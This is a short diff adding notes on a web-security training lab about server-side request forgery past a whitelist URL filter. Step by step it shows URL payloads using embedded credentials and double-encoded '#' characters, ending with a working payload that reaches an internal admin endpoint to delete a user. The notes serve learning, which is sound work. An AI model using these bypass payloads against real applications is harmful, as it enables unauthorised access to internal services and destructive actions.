@@ -1,0 +1,14 @@
+Lab #04: SSRF with whitelist-based input filter
+
+1. Application is checking the original url while checking for stock.
+2. Check if the application support embedded credential. It is accepted
+http://username@stock.weliketoshop.net/
+
+3. Append a # to the username and observe that the URL is now rejected. 
+stockApi=http://#@stock.weliketoshop.net/ --{"External stock check host must be stock.weliketoshop.net"
+http://%23@stock.weliketoshop.net/ --{ same error
+
+http://%2523@stock.weliketoshop.net/  --{ "Invalid external stock check url 'Invalid URL'"
+
+5. Change url to 
+http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
